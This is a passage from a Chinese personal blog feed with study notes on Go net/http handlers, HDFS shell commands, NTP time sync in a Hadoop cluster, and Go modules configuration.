punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103114058.png"></p></li><li><p>Get返回键对应的第一个值，如果键不存在会返回””,如果获取该键对应的值切片，请直接用规范格式的键访问map</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"net/http"</span><span class="token punctuation">)</span><span class="token comment">//创建处理器函数</span><span class="token keyword">func</span> <span class="token function">handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span>r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span><span class="token string">"你发送的请求地址是:"</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Path<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span><span class="token string">"你发送的请求地址后的查询字符串是:"</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>RawQuery<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span><span class="token string">"请求头中所有的信息有："</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>Header<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span><span class="token string">"请求头中Accept-Encoding的信息是:"</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>Header<span class="token punctuation">[</span><span class="token string">"Accept-Encoding"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">,</span>handler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":8080"</span><span class="token punctuation">,</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103114636.png"></p></li><li><p>  其中不同的是：r.Header[属性]获取到的是map</p></li><li><p>  r.Header.Get()获取到的是值，没有大括号，Get函数中的参数是string类型的属性，和大括号取值中大括号中的内容相同</p></li></ol><h3 id="refer属性"><a href="#refer属性" class="headerlink" title="refer属性"></a>refer属性</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103115525.png"></li><li>  Referer属性可以起到防盗链和广告计费的作用，防盗链：如果不是特定的页面跳转过来的权限不是完全开放；广告计费：在页面中加广告，当从特定的Referer跳转过来的时候，访问流量达到多少会计费</li></ol><h3 id="获取请求体中的信息"><a href="#获取请求体中的信息" class="headerlink" title="获取请求体中的信息"></a>获取请求体中的信息</h3><ol><li>  请求和响应的主体都是由Request结构中的Body字段表示，这个字段是io.ReadClose接口</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103160115.png"></li></ol><h2 id="获取请求参数"><a href="#获取请求参数" class="headerlink" title="获取请求参数"></a>获取请求参数</h2><ol><li><p>  通过net/http库中的Request结构的字段以及方法获取请求URL后面的query参数和POST或PUT的表单数据</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103161923.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103162114.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103162642.png"></p></li><li><p>  如果想要<strong>获取postform字段中的数据</strong>，需要<strong>特定enctype的属性值为application/x-www-form-urlencoded</strong>，指定编码方式，如果编码方式为multipart/form-data的属性值，则使用postform字段无法获取表单中的数据</p></li><li><p>  form表单的enctype属性的默认值时application/x-www-form-urlencode编码，<strong>实现文件上传时</strong>需要将<strong>该属性的值设置为multipart/form-data的编码格式</strong></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103164549.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103165559.png"></p></li><li><p>Request的type中，ContentLength属性记录相关内容的长度，在客户端，如果Body非nil而该字段为0，则表示不知道Body的长度</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//获取请求体中内容的长度</span><span class="token builtin">len</span> <span class="token operator">:=</span> r<span class="token punctuation">.</span>ContentLength <span class="token comment">//ContentLength属性在Request对象中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103171021.png"></p></li><li><p>将Body中的内容读到body中</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//将Body中的内容读到body中</span>r<span class="token punctuation">.</span>Body<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103171257.png"></p></li></ol><h3 id="通过直接调用FormValue方法和PostFormValue方法直接获取请求参数的值"><a href="#通过直接调用FormValue方法和PostFormValue方法直接获取请求参数的值" class="headerlink" title="通过直接调用FormValue方法和PostFormValue方法直接获取请求参数的值"></a>通过直接调用FormValue方法和PostFormValue方法直接获取请求参数的值</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103171640.png"></li><li>  FormValue函数传递的参数是键key，string类型的参数</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103172018.png"></li><li>  From是解析好的表单数据，包括URL的query参数和POST或PUT传递的表单数据</li></ol><h2 id="处理客户端响应"><a href="#处理客户端响应" class="headerlink" title="处理客户端响应"></a>处理客户端响应</h2><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103173336.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103173718.png"></p></li><li><p>  handler处理器的第一个参数，w http.ResponseWriter类型的对象w</p></li><li><p>例子</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter <span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>w<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"你的请求我已经收到"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103174031.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103174806.png"></p></li></ol><h3 id="给客户端响应改变为json格式"><a href="#给客户端响应改变为json格式" class="headerlink" title="给客户端响应改变为json格式"></a>给客户端响应改变为json格式</h3><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103184358.png"></p></li><li><p>记住，一定要<strong>导入encoding/json的包</strong></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">testJsonRes</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span>r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//设置响应内容的类型</span>w<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span><span class="token string">"application/json"</span><span class="token punctuation">)</span><span class="token comment">//创建User</span>user <span class="token operator">:=</span> model<span class="token punctuation">.</span>User<span class="token punctuation">&#123;</span>ID<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span>Username<span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span>Password<span class="token punctuation">:</span><span class="token string">"123456"</span><span class="token punctuation">,</span>Email<span class="token punctuation">:</span><span class="token string">"admin@atguigu.com"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token comment">//将User转换为Json格式</span>json<span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token comment">//将json格式的数据相应给客户端</span>w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">,</span>handler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/testJson"</span><span class="token punctuation">,</span>testJsonRes<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":8080"</span><span class="token punctuation">,</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="让客户端重定向"><a href="#让客户端重定向" class="headerlink" title="让客户端重定向"></a>让客户端重定向</h3><ol><li><p>处理器端代码</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span>r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//以下操作必须得在WriteHeader之前运行</span>w<span class="token punctuation">.</span><span class="token function">Header</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"Location"</span><span class="token punctuation">,</span><span class="token string">"https://www.baidu.com"</span><span class="token punctuation">)</span> <span class="token comment">//第一个参数是表明Location地址，第二个参数指定重定向位置</span>w<span class="token punctuation">.</span><span class="token function">WriteHeader</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">)</span> <span class="token comment">//设置响应的状态码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  可以看出，*http.Request 参数是用来处理用户的请求</p></li><li><p>  http.ReponseWriter用来给用户响应</p></li></ol><h2 id="模板引擎，处理响应数据"><a href="#模板引擎，处理响应数据" class="headerlink" title="模板引擎，处理响应数据"></a>模板引擎，处理响应数据</h2><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221104090340.png"></p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221104090544.png"></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">testTemplate</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span>r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//解析模板</span>t<span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFiles</span><span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>t<span class="token punctuation">.</span><span class="token function">Execute</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="处理静态文件"><a href="#处理静态文件" class="headerlink" title="处理静态文件"></a>处理静态文件</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221104100013.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> goweb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> goweb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop的HDFS操作</title>
      <link href="/Hadoop%E7%9A%84HDFS%E6%93%8D%E4%BD%9C/"/>
      <url>/Hadoop%E7%9A%84HDFS%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="Hadoop的HDFS操作"><a href="#Hadoop的HDFS操作" class="headerlink" title="Hadoop的HDFS操作"></a>Hadoop的HDFS操作</h1><ol><li><p>  在本地创建目录 /home/marry ，并在该目录下创建三个空文件，文件名分别为1.txt,2.txt,3.txt</p></li><li><p>```<br>  root@master:/home# mkdir marry<br>  root@master:/home# cd marry<br>  root@master:/home/marry# touch 1.txt<br>  root@master:/home/marry# touch 2.txt<br>  root@master:/home/marry# touch 3.txt</p>  <pre class="line-numbers language-none"><code class="language-none">3.   在HDFS上创建目录 &#x2F;demo&#x2F;test; &#x2F;demo&#x2F;test1 &#x2F;demo&#x2F;test2 &#x2F;demo&#x2F;test3 &#x2F;demo&#x2F;test44.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;实验四2.PNG)5.   &#96;&#96;&#96;     root@master:&#x2F;home&#x2F;marry# hadoop fs -mkdir -p &#x2F;demo&#x2F;test     root@master:&#x2F;home&#x2F;marry# hadoop fs -mkdir  &#x2F;demo&#x2F;test1     root@master:&#x2F;home&#x2F;marry# hadoop fs -mkdir  &#x2F;demo&#x2F;test2     root@master:&#x2F;home&#x2F;marry# hadoop fs -mkdir  &#x2F;demo&#x2F;test3     root@master:&#x2F;home&#x2F;marry# hadoop fs -mkdir  &#x2F;demo&#x2F;test4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  将本地的 1.txt 上传到 HDFS 的 /demo/test1 下，将 2.txt 和 3.txt 上传到 /demo/test 下</p></li><li></li><li><p>```<br>  root@master:/home/marry# hadoop fs -put /home/marry/1.txt /demo/test1<br>  root@master:/home/marry# hadoop fs -put /home/marry/2.txt /home/marry/3.txt /demo/test</p>  <pre class="line-numbers language-none"><code class="language-none">9.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;实验四3.PNG)10.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;实验四4.PNG)11.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;实验四5.PNG)12.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;实验四6.PNG)13.   将hello world写入到本地的1.txt文件中，再将其内容追加到HDFS的1.txt中，并查看是否追加成功14.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221011211422.png)15.   &#96;&#96;&#96;      root@master:&#x2F;home&#x2F;marry# echo hello world &gt; 1.txt      root@master:&#x2F;home&#x2F;marry# hadoop fs -appendToFile 1.txt &#x2F;demo&#x2F;test1&#x2F;1.txt      root@master:&#x2F;home&#x2F;marry# hadoop fs -cat &#x2F;demo&#x2F;test1&#x2F;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  将HDFS中的2.txt重命名为4.txt,并将4.txt复制到/demo/test4下</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221011212034.png"></p></li><li><p>```<br>  root@master:/home/marry# hadoop fs -mv /demo/test/2.txt /demo/test/4.txt<br>  root@master:/home/marry# hadoop fs -cp /demo/test/4.txt /demo/test4</p>  <pre class="line-numbers language-none"><code class="language-none">19.   将HDFS中的3.txt移动到&#x2F;demo&#x2F;test3下，文件名为33.txt20.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221011212341.png)21.   &#96;&#96;&#96;      root@master:&#x2F;home&#x2F;marry# hadoop fs -mv &#x2F;demo&#x2F;test&#x2F;3.txt &#x2F;demo&#x2F;test3&#x2F;33.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  将HDFS上的4.txt文件复制到本地的/home/marry下。</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221011212518.png"></p></li><li><p>```<br>  root@master:/home/marry# hadoop fs -get /demo/test4/4.txt /home/marry</p>  <pre class="line-numbers language-none"><code class="language-none">25.   删除HDFS上的4.txt文件。26.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221011212717.png)27.   &#96;&#96;&#96;      root@master:&#x2F;home&#x2F;marry# hadoop fs -rm &#x2F;demo&#x2F;test4&#x2F;4.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux集群时间同步</title>
      <link href="/%E9%9B%86%E7%BE%A4%E5%AE%9E%E7%8E%B0%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5/"/>
      <url>/%E9%9B%86%E7%BE%A4%E5%AE%9E%E7%8E%B0%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="linux集群时间同步"><a href="#linux集群时间同步" class="headerlink" title="linux集群时间同步"></a>linux集群时间同步</h1><ol><li><p>  在master，slave1，slave2上安装ntp以及ntpdate</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221011195716.png"></p></li><li><p>  将所有的机器的ntp都关闭掉</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221011195949.png"></p></li><li><p>  使用service ntp status查看三台机器的ntp状态</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221011200259.png"></p></li><li><p>  使用ctrl+c退出当前状态</p></li><li><p>  修改ntp server (仅在master即可) 的/etc/ntp.conf</p></li><li><p>  在/etc/目录下，使用crontab -e命令进入 /etc/ntp.conf</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221011201115.png"></p></li><li><p>  在vim中找到这一段文字，相应的地方注释掉，然后添加红框中的语句</p></li><li><p>```bash<br>  server 127.127.1.0<br>  fudge 127.127.1.0 stratum 10</p>  <pre class="line-numbers language-none"><code class="language-none">13.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221011201002.png)14.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221011201343.png)15.   这个地方去掉相应的#,然后填上16.   &#96;&#96;&#96;      restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  然后对ntp server (master) 执行sudo service ntp start 开启服务</p></li><li><p>  在slave1，slave2机器，将同步时间的命令放在crontab中（以slave1为例）</p></li><li><p>  第一步，在etc路径下运行crontab -e</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221011201857.png"></p></li><li><p>  退出方式：ctrl + x 然后问你是否保存，按y，然后回车即可保存并退出，slave2同理修改</p></li><li><p>  最后，运行sudo ntpdate master 进行同步时间的操作即可</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go语言项目及其配置</title>
      <link href="/go%E8%AF%AD%E8%A8%80%E9%A1%B9%E7%9B%AE%E5%8F%8A%E5%85%B6%E9%85%8D%E7%BD%AE/"/>
      <url>/go%E8%AF%AD%E8%A8%80%E9%A1%B9%E7%9B%AE%E5%8F%8A%E5%85%B6%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="GOPATH的工作模式"><a href="#GOPATH的工作模式" class="headerlink" title="$GOPATH的工作模式"></a>$GOPATH的工作模式</h1><ol><li>  GOPATH代表当前go语言所有项目所在路径</li><li>  在$GOPATH目录下，有三个文件夹</li><li>  bin目录是go语言编译过的所有可执行程序</li><li>  pkg用来存放默认导入的包，加快导入速度</li><li>  src存放源码</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221008184715.png"></li></ol><h2 id="go-modules模式"><a href="#go-modules模式" class="headerlink" title="go modules模式"></a>go modules模式</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221008184825.png"></li></ol><h3 id="go-mod环境变量"><a href="#go-mod环境变量" class="headerlink" title="go mod环境变量"></a>go mod环境变量</h3><ol><li><p>  可以通过go env命令来进行查看</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221008185029.png"></p></li><li><p>  GO111MODULE这个环境变量作为gomodules的开关</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221008185428.png"></p></li><li><p>  可以通过以下命令设置</p></li><li><p>```bash<br>  go env -w GO111MODULE=on</p>  <pre class="line-numbers language-none"><code class="language-none">## go proxy1.   这个环境变量主要是用于go模块代理，其作用是用于使go在后续拉取模块版本时直接通过镜像站点来快速拉取2.   类似于Linux换源的操作3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221008185931.png)4.   direct是一个特殊指示符，用于指示go网源码到模块版本的源地址去抓取5.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221008190212.png)## GOSUMDB1.   在拉取模块版本时，保证拉取到的模块版本数据未经过修改，如果发现不一样，也就是可能存在篡改，将会立即终止2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221008190919.png)3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221008190951.png)4.   通过go env来查看环境变量5.   &#96;&#96;&#96;bash     go env<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221008191023.png"></p></li></ol><h2 id="使用go-modules初始化项目"><a href="#使用go-modules初始化项目" class="headerlink" title="使用go modules初始化项目"></a>使用go modules初始化项目</h2><ol><li><p>  开启go modules</p></li><li><p>```bash<br>  go env -w GO111MODULES=on</p>  <pre class="line-numbers language-none"><code class="language-none">3.   或者可以通过直接设置系统环境变量（写入~&#x2F;.bash_profile文件亦可）4.   &#96;&#96;&#96;bash     export GO111MODULES&#x3D;on<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="创建完项目后初始化项目"><a href="#创建完项目后初始化项目" class="headerlink" title="创建完项目后初始化项目"></a>创建完项目后初始化项目</h2><ol><li><p>```</p><h1 id="创建project的目录"><a href="#创建project的目录" class="headerlink" title="创建project的目录"></a>创建project的目录</h1><p>  $ mkdir pkslow_test</p><h1 id="进入目录"><a href="#进入目录" class="headerlink" title="进入目录"></a>进入目录</h1><p>  $ cd pkslow_test/</p><h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1><p>  $ go mod init pkslow.com/pkslow_test<br>  go: creating new go.mod: module pkslow.com/pkslow_test</p><p>  $ l<br>  -rw-r–r–   1 larry  staff   39 Dec 13 21:07 go.mod<br>  #查看文件内容<br>  $ cat go.mod<br>  module pkslow.com/pkslow_test</p><p>  go 1.15</p>  <pre class="line-numbers language-none"><code class="language-none">2.   go mod init命令用来自动导入go.mod，这个文件中的内容决定了后面在导包的时候应怎么写3.   &#96;&#96;&#96;go     go mod init github.com&#x2F;aceld&#x2F;modules_test  &#x2F;&#x2F;后面在导包的时候就必须导入github.com&#x2F;aceld&#x2F;modules_test，包的名字可以自拟<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221008194624.png"></p></li><li><p>  如果当前文件夹下有go.mod文件，说明项目已经初始化成功，即可在当前文件夹下写项目</p></li></ol><h2 id="使用开源的库"><a href="#使用开源的库" class="headerlink" title="使用开源的库"></a>使用开源的库</h2><ol><li><p>```bash<br>  go get 库名</p>  <pre class="line-numbers language-none"><code class="language-none">2.   执行结束后，会在go.mod文件中有require一句提示,后面紧跟的就是所调用的库3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221009191950.png)4.   在拉取的同时会生成go.sum文件5.   后面跟着的 &#x2F;&#x2F; indirect 表示的是没有直接使用这个库，而是间接地使用了这个库，比如我使用了github.com&#x2F;aceld&#x2F;zinx&#x2F;ziface组件，而没有直接调用github.com&#x2F;aceld&#x2F;zinx库，在go.mod文件中就会显示 &#x2F;&#x2F; indrect .6.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221009192243.png)7.   在go.sum文件中会列出所有使用的库8.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221009192544.png)9.   go.mod的使用就是为了避免只能将项目放到$GOPATH&#x2F;src目录下的局限性，这样可以在任意文件夹创建项目## go get 下来的库都去哪了1.   在$GOPATH路径下，有三个文件夹，分别是bin,src和pkg2.   pkg文件夹下有mod文件夹，再往下走分别是不同开源的地方get下来的库3.   例如，在$GOPATH&#x2F;pkg&#x2F;mod&#x2F;github.com中存放的就是所有的github上get下来的库4.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20221009202041.png)## 改变模块之间的依赖关系1.   当模块更新时，有些api接口可能和之间的业务逻辑不同，需要修改为原来的模块2.   可以直接修改 **go.mod文件**3.   也可以使用命令进行替换4.   &#96;&#96;&#96;bash     go mod edit -replace&#x3D;原来的库和版本号&#x3D;现在的库和版本号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  在go.mod文件中，replace关键字起到的是重定向的作用</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221009202929.png"></p></li></ol><h1 id="及时通讯系统"><a href="#及时通讯系统" class="headerlink" title="及时通讯系统"></a>及时通讯系统</h1><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221009203251.png"></li></ol><h2 id="基础server构建"><a href="#基础server构建" class="headerlink" title="基础server构建"></a>基础server构建</h2><ol><li>  server.go中实现服务端的基本构建</li><li>  main.go用来作为项目的入口</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221009212020.png"></li><li>  两个形参</li><li>  network形参：，指定网络类型，tcp/udp,如果当前采用的是IPv4协议，则需要传形参为”tcp4/tcp6/tcp”</li><li>  address string用来指定服务器监听的地址</li><li>  返回值是一个listener和error</li><li>```go<br>  